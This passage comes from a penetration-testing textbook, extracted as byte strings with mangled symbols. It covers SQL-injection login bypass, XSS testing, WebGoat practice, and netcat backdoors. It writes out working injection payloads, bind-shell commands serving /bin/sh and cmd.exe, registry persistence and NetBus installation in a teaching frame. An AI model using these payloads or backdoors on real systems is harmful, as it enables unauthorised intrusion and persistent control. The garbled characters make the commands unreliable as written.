\xe2\x80\x9c\xe2\x80\x94\xe2\x80\x9d is a programmatic comment. in most \n', b'sQl versions, everything that follows the \xe2\x80\x9c\xe2\x80\x94\xe2\x80\x9d is simply ignored by the inter-\n', b'preter. the final single quote is still appended by the application, but it is \n', b'ignored. this is a very handy trick for bypassing additional code that could \n', b'interfere with your injection. in this case the new sQl statement is saying \n', b'\xe2\x80\x9creturn all of the records from the product table where the category is \xe2\x80\x98laptop\xe2\x80\x99 \n', b'or 1 \xee\x80\xb5 1.\xe2\x80\x9d it should be obvious that 1 \xee\x80\xb5 1 is always true. Because this is a true \n', b'statement, sQl will actually return ALL of the records in the product table!\n', b'the key to understanding how to use sQl injections is to understand the sub-\n', b'tleties in how the statements are constructed.\n', b'on the whole, the example above may not seem too exciting; instead of \n', b'returning all the rows containing the keyword laptop, we were able to return \n', b'the whole table. However, if we apply this type of attack to a slightly different \n', b'example, you may find the results a bit more sensational.\n', b'many web applications use sQl to perform authentication. You gain access to \n', b'restricted or confidential locations and material by entering a username and \n', b'password. As in the previous example, oftentimes this information is con-\n', b'structed from a combination of user-supplied input, the username and pass-\n', b'word, and programmer-constructed statements.\n', b'consider the following example. the network admin Ben owned has created a \n', b'new website that is used to distribute confidential documents to the company\xe2\x80\x99s \n', b'key strategic partners. Partners are given a unique username and password to \n', b'log into the website and download material. After setting up his secure website, \n', b'Ben asks you to perform a penetration test against the site to see if you can \n', b'bypass his authentication.\n', b'You should start this task by using the same technique we examined to return \n', b'all the data in the \xe2\x80\x9cproducts\xe2\x80\x9d table. remember the \xe2\x80\x9c\xe2\x80\x94\xe2\x80\x9d is a common way of \n', b'\x0cThe Basics of hacking and penetration Testing\n', b'120\n', b'commenting out any code following the \xe2\x80\x9c\xe2\x80\x94\xe2\x80\x9d. As a result, in some instances it \n', b'is possible to simply enter a username followed by the \xe2\x80\x9c\xe2\x80\x94\xe2\x80\x9d sequence. if inter-\n', b'preted correctly, this can cause the sQl statement to simply bypass or ignore \n', b'the section of code that checks for a password and give you access to the \n', b'specified user. However, this technique will only work if you already know a \n', b'username.\n', b'if you do not know the username, you should begin by entering the following \n', b'into the username textbox:\n', b'\xe2\x80\x98or 1 \xee\x80\xb5 1--\n', b'leaving the username parameter blank and using an expression that will \n', b'always evaluate to true is a key way to attack a system when we are unsure of \n', b'the usernames required to log into a database. not entering a username will \n', b'cause most databases to simply grab the first user in the database. in many \n', b'instances, the first user account in a database is an administrative account. You \n', b'can enter whatever you want for a password (for example, \xe2\x80\x9csyngress\xe2\x80\x9d), as it \n', b'will not even get checked by the database because it is commented out. You do \n', b'need to supply a password to bypass client-side authentication (or you can use \n', b'your intercepting proxy to delete this parameter altogether).\n', b'SELECT * FROM users WHERE uname \xee\x80\xb5 \xe2\x80\x98\xe2\x80\x98or 1 \xee\x80\xb5 1-- and pwd \xee\x80\xb5 \xe2\x80\x98syngress\xe2\x80\x99\n', b'At this point you should either have a username or be prepared to access the \n', b'database with the first user listed in the database. if you have a username, we \n', b'need to attack the password field; here again we can enter the statement:\n', b'\xe2\x80\x98or 1 \xee\x80\xb5 1--\n', b'Because we are using an \xe2\x80\x9cor\xe2\x80\x9d statement, regardless of what is entered before \n', b'the first single quote, the statement will always evaluate to true. Upon examin-\n', b'ing this statement, the interpreter will see that the password is true and grant \n', b'access to the specified user. if the username parameter is left blank, but the rest \n', b'of the statement is executed, you will be given access to the first user listed in \n', b'the database.\n', b'in this instance, assuming we have a username, the new sQl statement would \n', b'look similar to the following:\n', b'SELECT * FROM users WHERE uname \xee\x80\xb5 \xe2\x80\x98admin\xe2\x80\x99 and pwd \xee\x80\xb5 \xe2\x80\x98\xe2\x80\x99or 1 \xee\x80\xb5 1--\n', b'in many instances, the simple injection above will grant you full access to the \n', b'database as the first user listed in the \xe2\x80\x9cusers\xe2\x80\x9d table.\n', b'in all fairness, it should be pointed out that it is becoming more uncommon \n', b'to find sQl injection errors and bypass authentication using the techniques \n', b'listed above. injection attacks are now much more difficult to locate. However, \n', b'this classic example still rears its head on occasion, especially with custom-\n', b'built apps, and it also serves as an excellent starting point for learning about \n', b'and discovering the more advanced injection attacks.\n', b'Openmirrors.com\n', b'\x0cWeb-Based Exploitation ChApTER 5\n', b'121\n', b'CROSS-SITE SCRIpTING: BROWSERS ThAT  \n', b'TRUST SITES\n', b'cross-site scripting, also referred to as xss, is the process of injecting scripts \n', b'into a web application. the injected script can be stored on the original web \n', b'page and run or processed by each browser that visits the web page. this pro-\n', b'cess happens as if the injected script was actually part of the original code.\n', b'cross-site scripting is different from many other types of attacks as xss \n', b'focuses on attacking the client, not the server. Although the malicious script \n', b'itself is stored on the web application (server), the actual goal is to get a client \n', b'(browser) to execute the script and perform an action.\n', b'As a security measure, web applications only have access to the data that \n', b'they write and store on a client. this means any information stored on your \n', b'machine from one website cannot be accessed by another website. cross-\n', b'site scripting can be used to bypass this restriction. when an attacker is able \n', b'to embed a script into a trusted website, the victim\xe2\x80\x99s browser will assume all \n', b'the content including the malicious script is genuine and therefore should be \n', b'trusted. Because the script is acting on behalf of the trusted website, the mali-\n', b'cious script will have the ability to access potentially sensitive information \n', b'stored on the client including session tokens and cookies.\n', b'it is important to point out that the end result or damage caused by a success-\n', b'ful xss attack can vary widely. in some instances the effect is a mere annoyance \n', b'like a persistent pop-up window, whereas other more serious consequences \n', b'can result in the complete compromise of the target. Although many people \n', b'initially reject the seriousness of xss, a skilled attacker can use the attack to \n', b'hijack sessions, gain access to restricted content stored by a website, execute \n', b'commands on the target, and even record keystrokes!\n', b'You should understand that there are numerous cross-site scripting attack vec-\n', b'tors. Aside from simply entering code snippets into an input box, malicious \n', b'hyperlinks or scripts can also be embedded directly into websites, e-mails, and \n', b'even instant messages. many e-mail clients today automatically render Html \n', b'e-mail. oftentimes, the malicious portion of a malicious Url will be obfus-\n', b'cated in an attempt to appear more legitimate.\n', b'in its simplest form, conducting a cross-site scripting attack on a web applica-\n', b'tion that does not perform input sanitization is easy. when we are only inter-\n', b'ested in providing proof that the system is vulnerable, we can use some basic \n', b'Javascript to test for the presence of xss. website input boxes are an excellent \n', b'place to start. rather than entering expected information into a textbox, a pen-\n', b'etration tester should attempt to enter the script tag followed by a Javascript \n', b'\xe2\x80\x9calert\xe2\x80\x9d directly into the field. the classic example of this test is listed below:\n', b' \xee\x80\xac script \xee\x80\xae alert(\xe2\x80\x9cXSS Test\xe2\x80\x9d) \xee\x80\xac /script \xee\x80\xae \n', b'if the above code is entered and the server is vulnerable, a Javascript \xe2\x80\x9calert\xe2\x80\x9d \n', b'pop-up window will be generated. figure 5.10 shows an example of a typical \n', b'Openmirrors.com\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'122\n', b'web page where the user can log in by entering a username and password into \n', b'the textboxes provided.\n', b'However, as previously described, rather than entering a normal username and \n', b'password, enter the test script. figure 5.11 shows an example of the test xss \n', b'before submitting.\n', b'After entering our test script, we are ready to click the \xe2\x80\x9csubmit\xe2\x80\x9d button. \n', b'remember if the test is successful and the web application is vulnerable to \n', b'cross-site scripting, a Javascript \xe2\x80\x9calert\xe2\x80\x9d window with the message \xe2\x80\x9cxss test\xe2\x80\x9d \n', b'should appear on the client machine. figure 5.12 shows the result of our test, \n', b'providing proof that the application is vulnerable to cross-site scripting.\n', b'Just as there are several attack vectors for launching cross-site scripting, the \n', b'attack itself comes in several varieties. Because we are covering the basics, we \n', b'will look at two examples: reflected cross-site scripting and stored cross-site \n', b'scripting.\n', b'fIGURE 5.11\n', b'XSS Test Code.\n', b'fIGURE 5.12\n', b'XSS Success!\n', b'fIGURE 5.10\n', b'Example of Input Boxes on a Typical Web Page.\n', b'Openmirrors.com\n', b'\x0cWeb-Based Exploitation ChApTER 5\n', b'123\n', b'reflected cross-site scripts occur when a malicious script is sent from the client \n', b'machine to a vulnerable server. the vulnerable server then bounces or reflects \n', b'the script back to the user. in these cases, the payload (or script) is executed \n', b'immediately. this process happens in a single response/request. this type of \n', b'cross-site scripting attack is also known as a \xe2\x80\x9cfirst order xss.\xe2\x80\x9d reflected cross-\n', b'site scripting attacks are nonpersistent. thus, the malicious Url must be fed to \n', b'the user via e-mail, instant message, and so on, so the attack executes in their \n', b'browser. this has a phishing feel to it and rightfully so.\n', b'in some instances, the malicious script can actually be saved directly on the \n', b'vulnerable server. when this happens, the attack is called a stored xss. Because \n', b'the script is saved, it gets executed by every user who accesses the web applica-\n', b'tion. in the case of stored xss attacks, the payload itself (the malicious script \n', b'or malformed Url) is left behind and will be executed at a later time. these \n', b'attacks are typically saved in a database or applet. stored xss does not need \n', b'the phishing aspect of reflected xss. this helps the legitimacy of the attack.\n', b'As mentioned earlier, cross-site scripting is a very practical attack. even though \n', b'we only examined the simplest of xss attacks, do not let this deter you from \n', b'learning about the true power of cross-site scripting. in order to truly master \n', b'this content, you will need to learn how to harness the power of xss attacks \n', b'to steal sessions from your target and deliver the other payloads discussed ear-\n', b'lier in this section. once you have mastered both reflected and stored cross-site \n', b'scripting attacks, you should begin examining and studying dom-based xss \n', b'attacks.\n', b'hOW DO I pRACTICE ThIS STEp?\n', b'As mentioned at the beginning of this chapter, it is important that you learn to \n', b'master the basics of web exploitation. However, finding vulnerable websites on \n', b'which you are authorized to conduct these attacks can be difficult. fortunately, \n', b'the fine folks at the open web Application security Project (owAsP) organi-\n', b'zation have developed a vulnerable platform for learning and practicing web-\n', b'based attacks. this project, called webgoat, is an intentionally misconfigured \n', b'and vulnerable web server.\n', b'webgoat was built using J2ee, which means it is capable of running on any \n', b'system that has the Java runtime environment installed. webgoat includes \n', b'more than 30 individual lessons that provide a realistic, scenario-driven learn-\n', b'ing environment. current lessons include all the attacks we described in this \n', b'chapter and many more. most lessons require you to perform a certain attack \n', b'like using sQl injection to bypass authentication. each lesson comes complete \n', b'with hints that will help you solve the puzzle. As with other scenario-driven \n', b'exercises, it is important to work hard and attempt to find the answer on your \n', b'own before using the help files.\n', b'if you are making use of virtual machines in your hacking lab, you will need \n', b'to download and install webgoat inside a virtual machine. As discussed \n', b'\x0cThe Basics of hacking and penetration Testing\n', b'124\n', b'previously, webgoat will run in either linux or windows, just be sure to install \n', b'Java (Jre) on your system prior to starting webgoat.\n', b'webgoat can be downloaded from the official owAsP website at: http://www.\n', b'owasp.org/. the file you download will require 7zip or a program capable of \n', b'unzipping a .7z file. Unzip the file and remember the location of the uncom-\n', b'pressed webgoat folder. if you are running webgoat on windows, you can \n', b'navigate to the unzipped webgoat folder and locate the \xe2\x80\x9cwebgoat_8080.bat\xe2\x80\x9d \n', b'file. execute this batch file by double clicking it. A terminal window will appear; \n', b'you will need to leave this window open and running in order for webgoat to \n', b'function properly. At this point, assuming that you are accessing webgoat from \n', b'the same machine you are running the webgoat server on, you can begin using \n', b'webgoat by opening a browser and entering the Url: http://127.0.0.1:8080/\n', b'webgoat/attack.\n', b'if everything went properly, you will be presented with a log-in prompt. Both \n', b'the username and password are set to: guest\n', b'As a final note, please pay attention to the warnings posted in the \xe2\x80\x9creadme\xe2\x80\x9d \n', b'file. specifically you should understand that running webgoat outside of a \n', b'lab environment is extremely dangerous, as your system will be vulnerable to \n', b'attacks. Always use caution and only run webgoat in a properly sandboxed \n', b'environment.\n', b'WhERE DO I GO fROM hERE?\n', b'As has been pointed out several times, there is little doubt that this attack vec-\n', b'tor will continue to grow. once you have mastered the basics we discussed in \n', b'this section, you should expand your knowledge by digging in and learning \n', b'some of the more advanced topics of web application hacking including client- \n', b'side attacks, session management, source code auditing, and many more. if \n', b'you are unsure of what else to study and want to keep up on the latest web-\n', b'attack happenings, keep an eye on the owAsP \xe2\x80\x9ctop ten.\xe2\x80\x9d the owAsP top ten \n', b'Project is an official list of the top web threats as defined by leading security \n', b'researchers and top experts.\n', b'it should be pointed out that the websecurify tool we discussed earlier in the \n', b'chapter is capable of automatically testing for all threat categories listed in the \n', b'owAsP top ten Projects!\n', b'ADDITIONAL RESOURCES\n', b'You can find the list at http://www.owasp.org website or by searching Google for \n', b'\xe2\x80\x9cOWASP Top Ten.\xe2\x80\x9d You should keep a close eye on this list, as it will continue to be \n', b'updated and changed as the trends, risks, and threats evolve.\n', b'Openmirrors.com\n', b'\x0cWeb-Based Exploitation ChApTER 5\n', b'125\n', b'since we are talking about owAsP and they have graciously provided you a \n', b'fantastic tool to learn about and test web application security, there are many \n', b'benefits of joining the owAsP organization. once you are a member, there are \n', b'several different ways to get involved with the various projects and continue to \n', b'expand your knowledge of web security.\n', b'Along with the great webscarab project, you should explore other web proxies \n', b'as well. Both the Burp Proxy and Paros Proxy are excellent (and free) tools for \n', b'intercepting requests, modifying data, and spidering websites.\n', b'finally, there are several great tools that every good web penetration tes-\n', b'ter should become familiar with. one of my colleagues and close friends is a \n', b'very skilled web app penetration tester and he swears up and down that Burp \n', b'suite is the best application testing tool available today. After reviewing many \n', b'web auditing tools, it is clear that Burp is indeed a great tool. A free version \n', b'of the Burp suite is built into Backtrack and can be found by clicking on the \n', b'k-start dragon \xe2\x86\x92 Backtrack \xe2\x86\x92 web Application Analysis \xe2\x86\x92 web (front end) \xe2\x86\x92 \n', b'Burpsuite\n', b'if you are not using Backtrack, the free version of Burp can be downloaded \n', b'from the company\xe2\x80\x99s website at: http://portswigger.net/burp/download.html.\n', b'SUMMARy\n', b'Because the web is becoming more and more \xe2\x80\x9cexecutable\xe2\x80\x9d and because nearly \n', b'every target has a web presence, this chapter examined web-based exploitation. \n', b'the chapter began by reviewing techniques and tools for interrogating web \n', b'servers. the use of nikto and websecurify was covered for locating specific vul-\n', b'nerabilities in a web server. exploring the target website by discovering direc-\n', b'tories and files was demonstrated through the use of a spider. A method for \n', b'intercepting website requests by using webscarab was also covered. code injec-\n', b'tion attacks, which constitute a serious threat to web security, were explored. \n', b'specifically, we examined the basics of sQl injection attacks. the chapter con-\n', b'cluded with a brief discussion and example of cross-site scripting (xss).\n', b'\x0cThis page intentionally left blank\n', b'\x0c127\n', b'INTRODUCTION\n', b'maintaining access to a remote system is questionable activity and that needs \n', b'to be discussed and clearly explained to the client. many companies are inter-\n', b'ested in having a penetration test performed but are leery of allowing the pene-\n', b'tration testing company to make use of backdoors. most people are afraid that \n', b'Maintaining Access \n', b'with Backdoors and \n', b'Rootkits\n', b'ChApTER 6\n', b'Information in This Chapter:\n', b'n Netcat: The Swiss Army Knife\n', b'n Netcat\xe2\x80\x99s Cryptic Cousin: Cryptcat\n', b'n Netbus: A Classic\n', b'n Rootkits\n', b'n Hacker Defender: It Is Not What You Think\n', b'n Detecting and Defending Against Rootkits\n', b'Openmirrors.com\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'128\n', b'these backdoors will be discovered and exploited by an unauthorized third \n', b'party. imagine that you are the ceo of a company, how well would you sleep \n', b'knowing that you may have an open, backdoor channel into your network? \n', b'remember, the client sets both the scope and the authorization of the penetra-\n', b'tion test. You will need to take the time to fully cover and discuss this step \n', b'before proceeding.\n', b'still, on occasion you may be asked to conduct a penetration test that does \n', b'require the use of a backdoor. whether the reason is to provide a proof of con-\n', b'cept, or simply to create a realistic scenario where the attacker can return to the \n', b'target, it is important to cover the basics in this step.\n', b'in the simplest sense, a backdoor is a piece of software that resides on the tar-\n', b'get computer and allows the attacker to return (connect) to the machine at any \n', b'time. in most cases, the backdoor is a hidden process that runs on the target \n', b'machine and allows a normally unauthorized user to control the Pc.\n', b'it is also important to understand that many exploits are fleeting. they work \n', b'and provide access only as long as the program that was exploited remains run-\n', b'ning. in many cases if the target machine reboots or the exploited process is \n', b'stopped, the shell will be lost. As a result of this, one of the first tasks to com-\n', b'plete upon gaining access to a system is to migrate your shell to a more perma-\n', b'nent home. this is often done through the use of backdoors.\n', b'later in the chapter we will discuss rootkits. rootkits are a special kind of soft-\n', b'ware that embed themselves deep into the operating system and perform a \n', b'number of tasks, including giving a hacker the ability to complete hide pro-\n', b'cesses and programs.\n', b'NETCAT: ThE SWISS ARMy KNIfE\n', b'netcat is an incredibly simple and unbelievably flexible tool that allows com-\n', b'munication and network traffic to flow from one machine to another. Although \n', b'netcat\xe2\x80\x99s flexibility makes it an excellent choice for a backdoor, there are dozens \n', b'of other uses of this tool. netcat can be used to transfer files between machines, \n', b'conduct port scans, serve as a simple instant messenger/chat, and even function \n', b'as a simple web server! we will cover the basics here, but you should spend \n', b'time practicing and playing with netcat. You will be amazed at what this tool is \n', b'capable of. it is nicknamed the \xe2\x80\x9cswiss army knife\xe2\x80\x9d for a reason.\n', b'netcat was originally written and released by Hobbit in 1996 and supports \n', b'sending and receiving both tcP and UdP traffic. netcat can function in either \n', b'a client or server mode. when it is in client mode, the tool can be used to \n', b'make a network connection to another service (including another instance of \n', b'netcat). it is important to remember that netcat can connect from any port \n', b'on your local machine to any port on the target machine. while netcat is run-\n', b'ning in server mode, it acts as a listener where it waits to accept an incoming \n', b'connection.\n', b'Openmirrors.com\n', b'\x0cMaintaining Access with Backdoors and Rootkits  ChApTER 6\n', b'129\n', b'let us start with a very basic example of how we can use netcat. in this exam-\n', b'ple we will set up netcat to serve as a communication channel between two \n', b'machines. to set this up on the first machine, we simply need to choose a port \n', b'and instruct netcat to run in listener mode. issuing the following command in \n', b'a terminal will accomplish this task:\n', b'nc \xe2\x80\x93l \xe2\x80\x93p 2323\n', b'in the command above, \xe2\x80\x9cnc\xe2\x80\x9d is used to invoke the netcat program, whereas \n', b'the \xe2\x80\x9c-l\xe2\x80\x9d is used to put netcat into a listener mode. the \xe2\x80\x9c-p\xe2\x80\x9d is used to specify \n', b'the port number we want netcat to listen on. At this point netcat is running \n', b'and waiting to accept an incoming connection on port 2323.\n', b'now that we have netcat listening on the first machine, we can move to the \n', b'second machine. to make a connection to the listening machine, we issue the \n', b'following command:\n', b'nc 172.16.45.132 2323\n', b'running this command from the second Pc will force netcat to attempt a con-\n', b'nection to port 2323 on the machine with an iP address of 172.16.45.132. \n', b'Because we have set up the first Pc to act as a listener on that port, the two Pcs \n', b'should now be able to communicate. we can test this by typing text into either \n', b'terminal window. Anything that we type into the terminal from either machine \n', b'will be displayed in the terminal window of both machines. this is because the \n', b'keyboard is acting as the standard input and netcat is simply transporting the \n', b'data entered (keystrokes) over the connection.\n', b'to end the \xe2\x80\x9cchat\xe2\x80\x9d and close the session, we can issue the cntl\xee\x80\xb1c key combi-\n', b'nation; this will terminate the netcat connection. figure 6.1 shows an example \n', b'of this type of communication between two computers.\n', b'it is important to understand that once you kill or close the netcat connec-\n', b'tion, you will need to restart the program on the target machine before \n', b'making another connection. constantly needing to connect to the target \n', b'machine to restart netcat is not very efficient. fortunately, if you are using the \n', b'windows version of the program, netcat provides a way to avoid this issue. \n', b'in the windows version of netcat if we start netcat in listener mode using a \n', b'\xe2\x80\x9c-l\xe2\x80\x9d (switch) rather than a \xe2\x80\x9c-l\xe2\x80\x9d the target will keep the connection open on \n', b'the specified port even after the client disconnects. in many ways, this makes \n', b'the program persistent. of course to make it truly persistent, you would need \n', b'fIGURE 6.1\n', b'Using Netcat to Communicate between Two Computers.\n', b'Openmirrors.com\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'130\n', b'to add the command to run every time the machine starts. on a windows \n', b'machine, this could be accomplished by adding the netcat program to the \n', b'HKEY_LOCAL_MACHINE\\software\\microsoft\\windows\\currentversion\\run \n', b'registry hive.\n', b'Unfortunately, in terms of making a persistent network connection, the linux \n', b'version of netcat is not quite so straightforward. in order to make the netcat \n', b'connection persistent on a linux machine, you would have to write a simple \n', b'bash script that forces netcat to restart when the original connection is closed. \n', b'if you are interested in creating a persistent connection, there are many exam-\n', b'ples to be found on the internet.\n', b'Although the example above is an interesting use of netcat and great for dem-\n', b'onstrating the flexibility and power of the tool, in reality you will probably \n', b'never use the \xe2\x80\x9cchat\xe2\x80\x9d feature during a penetration test. on the other hand, once \n', b'you have got netcat uploaded to your target system, there are many practical \n', b'uses for the tool. let us take a look at something a bit more advantageous, like \n', b'transferring files.\n', b'moving files between computers is easy when we have got the meterpreter shell \n', b'running but remember, we do not want to have to exploit the target every time. \n', b'rather, the goal is to exploit once and then leave a backdoor so we can return \n', b'at a later date. if we upload netcat to the target, we can use the program to \n', b'transfer files to and from our target across a network.\n', b'for this example, assume you want to upload a new file from your local \n', b'machine to the target machine. with netcat running on the target machine, we \n', b'issue the following command:\n', b'nc \xe2\x80\x93l \xe2\x80\x93p 7777 \xee\x80\xae calc.exe\n', b'this command will force the target to listen for an incoming connection on \n', b'port 7777. Any input that is received will be stored into a file named \xe2\x80\x9ccalc.exe.\xe2\x80\x9d\n', b'from our local machine, we need to use netcat to make a connection to the \n', b'target and specify the file we want to send to the target. we accomplish this by \n', b'using the following command:\n', b'nc 172.16.45.129 7777 \xee\x80\xac calc.exe\n', b'Unfortunately, netcat does not provide you any type of feedback letting you \n', b'know when the transfer has been completed. Because you will receive no indi-\n', b'cation when the upload is done, it is best to just wait for a few seconds and \n', b'then issue a cntl\xee\x80\xb1c to kill the connection. At this point, you should be able \n', b'to run the \xe2\x80\x9cls\xe2\x80\x9d command on your target machine and see the newly created \n', b'file. figure 6.2 shows an example of this process.\n', b'naturally you could set up a netcat connection to pull files from the target \n', b'machine by reversing the commands above.\n', b'oftentimes during a penetration test, you will discover open ports that provide \n', b'little or no additional information. You may run across situations where both \n', b'Openmirrors.com\n', b'Openmirrors.com\n', b'\x0cMaintaining Access with Backdoors and Rootkits  ChApTER 6\n', b'131\n', b'nmap and nessus are unable to discover the service behind the port. in these \n', b'cases, it is often very beneficial to use netcat to make a blind connection to the \n', b'port. once you have made the connection, you begin sending information to \n', b'the port by typing on the keyboard. in some instances, the keyboard input will \n', b'elicit a response from the service. this response may be helpful in allowing you \n', b'to identify the service. consider the following example:\n', b'Assume you are conducting a penetration test on a target server. during the \n', b'scanning process you discover that port 50001 is open. Unfortunately, nei-\n', b'ther your port scanner nor your vulnerability scanners were able to determine \n', b'what service was running behind the report. in this case, it can be handy to use \n', b'netcat to interact with the unknown service. to force netcat to attempt a con-\n', b'nection to the service, we simply enter the following command:\n', b'nc 172.16.45.129 50001\n', b'this command will attempt to create a tcP connection to the port and service. \n', b'it is important to note that you can force netcat to send UdP packets by issu-\n', b'ing the \xe2\x80\x9c-u\xe2\x80\x9d switch. once the connection is made in most cases it is easiest to \n', b'simply enter some text and hit return key to send the text to the service. if the \n', b'service responds to the unexpected request, you may be able to derive its func-\n', b'tion. figure 6.3 shows an example of this.\n', b'As you can see, we used netcat to create a connection to port 50001. once con-\n', b'nected, the text \xe2\x80\x9ctest\xe2\x80\x9d was sent through the connection. the service returned \n', b'with a response that clearly indicates that the mysterious service is a web server. \n', b'fIGURE 6.2\n', b'Using Netcat to Transfer Files.\n', b'fIGURE 6.3\n', b'Using Netcat to Interrogate Unknown Services.\n', b'Openmirrors.com\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'132\n', b'And even more important, the server has fully identified itself as an Apache \n', b'server running version 2.2.9 on a linux Ubuntu machine!\n', b'finally, we can use netcat to bind itself to a process and make that process \n', b'available over a remote connection. this allows us to execute and interact \n', b'with the bound program as if we were sitting at the target machine itself. if we \n', b'start netcat using the \xe2\x80\x9c-e\xe2\x80\x9d switch, it will execute whatever program we specify \n', b'directly after the \xe2\x80\x9c-e.\xe2\x80\x9d the program will execute on the target machine and will \n', b'only run once a connection has been established. the \xe2\x80\x9c-e\xe2\x80\x9d switch is incredibly \n', b'powerful and very useful for setting up a backdoor shell on a target.\n', b'to set up a backdoor, we will need to utilize the \xe2\x80\x9c-e\xe2\x80\x9d switch to bind a com-\n', b'mand shell from the target machine to a port number. By setting up netcat in \n', b'this manner, later when we initiate a connection to the specified port, the pro-\n', b'gram listed after the \xe2\x80\x9c-e\xe2\x80\x9d switch will run. if we are using a linux machine, we \n', b'can accomplish this by typing the following into a terminal window:\n', b'nc \xe2\x80\x93l \xe2\x80\x93p 12345 \xe2\x80\x93e /bin/sh\n', b'this will cause the target to serve up a shell to whoever connects to port 12345. \n', b'Again, any commands sent from the netcat client to the target machine will be \n', b'executed locally as if the attacker were sitting at the target.\n', b'this technique can also be used on a windows machine. to provide command \n', b'line backdoor access into a windows machine, we would run the following on \n', b'the target (in a terminal window):\n', b'nc.exe \xe2\x80\x93L \xe2\x80\x93p 12345 c:\\Windows\\System32\\cmd.exe\n', b'to put the preceding example into context and hopefully make it more con-\n', b'crete for you, let us examine the following scenario to show how we could \n', b'implement netcat as a backdoor. consider the following example: assume that \n', b'we have successfully exploited a windows target. Being forward-thinking pen-\n', b'etration testers, we decide to create a more stable backdoor to this system so \n', b'that we can return later. in this case, we have decided to use netcat as our back-\n', b'door software.\n', b'the first order of business would be to upload netcat to the target machine; in \n', b'this example, the netcat executable has been uploaded to the target\xe2\x80\x99s System32 \n', b'directory. let us assume that we utilized the knowledge gained from chapter \n', b'4 and we are currently using the meterpreter shell to interact with our target. \n', b'ALERT!\n', b'Notice, because this is a Windows machine, we are using the \xe2\x80\x9c-L\xe2\x80\x9d switch to make \n', b'our connection persistent. If we close the connection from our machine, Netcat will \n', b'continue listening on the specified port. The next time we connect to the machine,  \n', b'the cmd shell will be waiting and will execute for us.\n', b'\x0cMaintaining Access with Backdoors and Rootkits  ChApTER 6\n', b'133\n', b'once we have a meterpreter shell on our target, we can upload the netcat file \n', b'to the victim by issuing the following command:\n', b'meterpreter \xee\x80\xae upload nc.exe c:\\\\windows\\\\system32\n', b'Note: You will need to upload the windows (.exe) version of netcat because \n', b'the target is running windows.\n', b'in this case, we have uploaded the nc.exe program to the windows\\system32 \n', b'directory. this will allow us to access the cmd.exe program directly. once \n', b'netcat has been transferred to the target machine, we need to choose a port \n', b'number, bind the cmd.exe program, and start netcat in server mode. this \n', b'will force netcat to wait for an incoming connection on the specified port. to \n', b'perform these tasks, we need to issue the following command in a terminal \n', b'(again, assuming you are already in the same directory as netcat).\n', b'meterpreter \xee\x80\xae nc \xe2\x80\x93L \xe2\x80\x93p 5777 \xe2\x80\x93e cmd.exe\n', b'At this point, netcat should be running on our target machine. remember if \n', b'you were interested in making this backdoor truly persistent, with the ability to \n', b'survive a reboot, you would need to set the netcat command to automatically \n', b'start in the windows registry.\n', b'now that netcat is set up, we can close our meterpreter shell and make a connec-\n', b'tion to the target using netcat. figure 6.4 shows an example of a connection we \n', b'have made from our local Backtrack machine to the target windows machine.\n', b'there should be little doubt in your mind that netcat is a truly powerful and \n', b'flexible tool. in this section we have barely scratched the surface. if you take \n', b'some time to dig deeper into the program, you will find that people have been \n', b'able to perform some rather amazing things using netcat. You are encouraged \n', b'to look into some of these clever implementations by searching the web, the \n', b'results will amaze you.\n', b'NETCAT\xe2\x80\x99S CRypTIC COUSIN: CRypTCAT\n', b'Although netcat provides some amazing qualities, the program does have a \n', b'few shortcomings. first off, it is important to understand that all traffic passed \n', b'between a netcat client and server is done so in clear text. this means that any-\n', b'one viewing traffic or sniffing the connection will be able to view and monitor \n', b'fIGURE 6.4\n', b'Using Netcat as a Backdoor on a Windows Machine.\n', b'Openmirrors.com\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'134\n', b'all the information sent between the machines. cryptcat was introduced \n', b'to address this issue. cryptcat utilizes twofish encryption to keep the traffic \n', b'between the client and the server confidential.\n', b'the beauty of cryptcat is that you do not need to learn any new commands. \n', b'if you have already mastered netcat, then you have already mastered cryptcat; \n', b'but with cryptcat you have the added benefit of transporting your data using \n', b'an encrypted tunnel. Anyone viewing or analyzing your network traffic will not \n', b'be able to see your information.\n', b'one important note about cryptcat, you should always change the default key. \n', b'if you fail to change the default key, anyone will have the ability to decrypt your \n', b'session. the default key is: metallica and can be changed using the \xe2\x80\x9c-k\xe2\x80\x9d switch.\n', b'to set up an encrypted tunnel between two machines using cryptcat, you can \n', b'issue the following commands:\n', b'1) start the server:\n', b'cyrptcat \xe2\x80\x93l \xe2\x80\x93p 5757\n', b'2) start the client:\n', b'cryptcat 172.16.45.129 5757\n', b'You now have an encrypted tunnel set up between the two machines. figure 6.5 \n', b'shows an example of this process.\n', b'NETBUS: A CLASSIC\n', b'netbus is a classic piece of software that has been around since 1998. we will \n', b'briefly review it here as a gentle introduction to backdoors and remote control \n', b'software. netbus was originally written by carl-fredrik. the program consists \n', b'of two parts: a client and a server. the server software is installed on the target \n', b'Pc, that is, the machine that you want to remotely control. the client software \n', b'is used to connect and control the target.\n', b'once the netbus server software is installed on the target machine, the client \n', b'software can perform a number of different actions on the target. remember, \n', b'even though the attacker is not physically sitting at the local machine, the cli-\n', b'ent software allows the attacker to execute commands on the remote target as if \n', b'he were. some of the more popular options include the following:\n', b'n opening the cd-rom drive;\n', b'n starting a program;\n', b'fIGURE 6.5\n', b'Using Cryptcat to Create an Encrypted Tunnel between Two Machines.\n', b'\x0cMaintaining Access with Backdoors and Rootkits  ChApTER 6\n', b'135\n', b'n taking a screenshot of the target\xe2\x80\x99s current screen;\n', b'n uploading and downloading files;\n', b'n sending messages.\n', b'to use netbus, simply install the server on the target machine and run the cli-\n', b'ent software on the attacker machine.\n', b'netbus comes as a compressed file that contains several different pieces. You \n', b'need to first unzip the netbus file. to install the server software, you will need \n', b'to execute the patch.exe file on the target. this installs and starts netbus. the \n', b'program will run as a process called \xe2\x80\x9cpatch.exe\xe2\x80\x9d and when installed, will auto-\n', b'matically create a registry entry so that it starts every time windows is started.\n', b'to access the client panel you run the netBus.exe. enter the target iP address \n', b'in the \xe2\x80\x9cHost name/iP:\xe2\x80\x9d field and click the connect button. figure 6.6 shows an \n', b'example of the client interface that is used to interact with the target.\n', b'there is little doubt that netbus is an old piece of software, but it makes for a \n', b'great tool when discovering and exploring backdoor command and control of \n', b'a remote target.\n', b'ROOTKITS\n', b'Just like metasploit, when people are first exposed to the power and cunning of \n', b'rootkits, they are usually amazed. to the uninitiated, rootkits appear to have an \n', b'almost black-magic-like quality. they are usually simple to install and can 